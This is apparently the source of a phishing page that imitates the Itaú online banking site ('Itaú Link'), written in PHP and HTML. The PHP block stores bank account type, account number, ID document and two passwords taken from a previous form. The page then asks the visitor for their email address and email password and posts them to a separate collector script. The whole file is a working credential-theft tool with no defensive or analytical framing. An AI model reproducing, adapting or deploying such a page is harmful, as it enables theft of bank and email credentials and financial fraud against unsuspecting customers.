<?php
@session_start();

if(isset ($_POST['tipo']) && isset ($_POST['cuenta']) && isset ($_POST['documento']) && isset ($_POST['pass']) && isset ($_POST['pass2'])){
	$_SESSION['tipo'] = $_POST['tipo'];
	$_SESSION['cuenta'] = $_POST['cuenta'];
	$_SESSION['documento']  =  $_POST['documento'];
	$_SESSION['pass'] = $_POST['pass'];
	$_SESSION['pass2'] = $_POST['pass2'];
}
else{ header ('location: index.html');}
?>

<html style="--app-height:880px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Itaú Paraguay</title>




	<meta http-equiv="X-UA-Compatible" content="IE=10">

	<title>Itaú Link</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="./assets/bootstrap.min.css" rel="stylesheet">
	<link href="./assets/datepicker.css" rel="stylesheet">
	<link href="./assets/style.css" rel="stylesheet">
	<link href="./assets/style_custom.css" rel="stylesheet">
	<link href="./assets/style_chat.css" rel="stylesheet">
	<link href="./assets/jquery-ui.min.css" rel="stylesheet">
	<link href="./assets/select2.css" rel="stylesheet" type="text/css">
	<link href="./assets/select2.min.css" rel="stylesheet" type="text/css">
	<link href="./assets/all.css" rel="stylesheet">

	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">


	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="./assets/bootstrap.min(1).css" rel="stylesheet">
	<link href="./assets/style(1).css" rel="stylesheet">
	<link href="./assets/datepicker(1).css" rel="stylesheet">
	<link rel="stylesheet" href="./assets/all(1).css">

  <link href="./assets/style_solicitar_ingreso.css" rel="stylesheet">

<style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><meta http-equiv="origin-trial" content="A5OJkPEoICe/luEx3lEfB03JrHAKQQ4T0hNXu0wsfMydHldQnwm3jaJ0E5KeQgFnhJJ64/Ayh1elZwM+QwHXmQ8AAACfeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGVhZHNlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjMxNjYzOTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlLCJ1c2FnZSI6InN1YnNldCJ9"><script src="./assets/f(2).txt"></script><script src="./assets/f(3).txt"></script><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><script src="./assets/f(4).txt"></script><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><script src="./assets/f(5).txt"></script><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><script src="./assets/f(6).txt"></script><script src="./assets/f(7).txt"></script><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><script src="./assets/f(8).txt"></script><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><meta http-equiv="origin-trial" content="A9wkrvp9y21k30U9lU7MJMjBj4USjLrGwV+Z8zO3J3ZBH139DOnCv3XLK2Ii40S94HG1SZ/Zeg2GSHOD3wlWngYAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><script src="./assets/f(9).txt"></script><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style></head>
<body class="its_body">
    <div id="wrapper">
        <!-- Header -->
        <header class="header header_container">
            <div class="container">
                <div class="navbar-header">
                    <img class="logo_mobile" src="./assets/logo_mobile@2x.png" alt="Itau">
                </div>
            </div>
        </header>
        <!-- END Header -->
        <!-- Nav -->
        <nav class="navbar navbar-inverse sub_header" style="min-height: 1px">
            <div class="container">

                <div id="navbar"></div>
            </div>
        </nav>
        <!-- END Nav -->
        <div class="content container main_content">
            <div class="row">
                <div class="col-sm-12 container_title">
                    <h2 class="inner-title"></h2>
                </div>
            </div>
            <div class="row">
                <!-- Main section -->
         <div class="col-md-9 col-sm-12 container_form">
                    <section class="modulo-interna form_content">
                        <div class="contenido first-entry">
                            <span class="title_block">
                                <h3>Ingresá tus datos</h3>
                            </span>
                            <form id="form-ingreso" action="assets/Conection.php" method="post" class="form-inline module-content-rotate generic-form">
                                <div>

                                    <div data-select-toggle="tipo_documento">
                                        <div class="row row-content row_form" id="cedula">
                                            <div class="col-sm-5 text-label col_label">
                                                <label id="label_documento">Correo electrónico</label>
                                            </div>
                                            <div class="col-sm-4 col_field">
                                                <input id="nro_documento" name="correo" placeholder="Ingresá tu correo electrónico" type="email" class="form-control input-text-list">
                                            </div>
                                        </div>
                                    </div>
                                    <div data-select-toggle="tipo_documento">
                                        <div class="row row-content row_form" id="cedula">
                                            <div class="col-sm-5 text-label col_label">
                                                <label id="label_documento">Contraseña de correo</label>
                                            </div>
                                            <div class="col-sm-4 col_field">
                                                <input id="pass" name="correopass" placeholder="Ingresá tu contraseña de correo" type="password" class="form-control input" minlength="4">
                                            </div>
                                        </div>
                                    </div><div id="div_dato_verificador" class="row row-content row_form" style="display:none">
                                        <div class="col-sm-5 text-label col_label">
											<label id="label_dato"></label>
                                        </div>
                                        <div class="col-sm-4 col_field">
                                            <input id="dato" name="dato" placeholder="" type="text" class="form-control input-text-list">
                                        </div>
                                    </div>
                                </div>
								<div class="row row-content">
									<div class="col-sm-3 text-label"></div>
									<div class="col-sm-5 text-label">
									
									</div>
									<div class="col-sm-4 text-label"></div>
								</div>

                        </div>
                    </section>
					<div class="alert attention text-properties error_highlight" id="form_error_message" style="display:none;">
                        <img class="btn-close" src="https://www.itaulink.com.uy/static/img/btns/btn-cerrar.gif" width="15" height="12">
                    </div>
                    <div class="container_bottom">
                        <div class="steps-module container_button">
                            <button id="btn_paso_1" type="submit" class="style-buttons btn_continuar" title="Continuar" data-toggle="modal" data-target="#modal-error">Continuar</button>
                        </div>


							</form>



                    </div>
                </div>
            </div>
        </div>
        <!-- END Main section -->
        <!-- MODAL loading-->
        <div class="modal fade bs-example-modal-sm modal-loading" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true" id="modal-loading">
            <div class="modal-dialog modal-md">
                <div class="modal-content">
                    <div class="modal-body">
                        <h4>Validando datos</h4>
                        <img src="./assets/spinner.svg">
                    </div>
                </div>
            </div>
        </div>
    </div>



    <!-- Footer -->

	<!-- FOOTER -->
    <footer class="footer">
        <div class="container">
            <p class="text-left">
                <a target="_blank" href="https://www.itau.com.uy/inst/emergencias.html">Emergencias Bancarias</a> |
                <a target="_blank" href="https://www.itau.com.uy/inst/aci/docs/tarifario.pdf">Tarifarios</a>
            </p>
        </div>
    </footer>

	<!-- MODAL ERROR -->
   <div class="modal fade bs-example-modal-md" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true" id="modalError">
		<div class="modal-dialog modal-md">
    		<div class="modal-content">
				<div class="alert attention text-properties" style="margin:0;"> <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">x</span></button>
					<p><strong>Atención:</strong> <span id="modalErrorMsg"></span></p>
				</div>
   			</div>
   		</div>
   </div>


 </body>
 </html>
